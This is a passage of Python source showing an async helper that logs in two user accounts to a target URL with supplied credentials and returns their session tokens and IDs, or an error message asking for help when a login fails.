    email_a: str, pass_a: str,
    email_b: str, pass_b: str,
) -> dict:
    """Login with manually provided credentials."""
    from modules.auto_accounts import login_one_account, _needs_help

    token_a, uid_a = await login_one_account(target_url, email_a, pass_a)
    if not token_a:
        return _needs_help(
            error="Manual login failed for User A",
            help_message=f"Could not log in as {email_a}. Check credentials."
        )

    token_b, uid_b = await login_one_account(target_url, email_b, pass_b)
    if not token_b:
        return _needs_help(
            error="Manual login failed for User B",
            help_message=f"Could not log in as {email_b}. Check credentials."
        )

    return {
        "success": True,
        "token_a": token_a, "user_a_email": email_a, "user_a_id": uid_a,
        "token_b": token_b, "user_b_email": email_b, "user_b_id": uid_b,
        "error": None, "needs_help": False, "help_message": None,
    }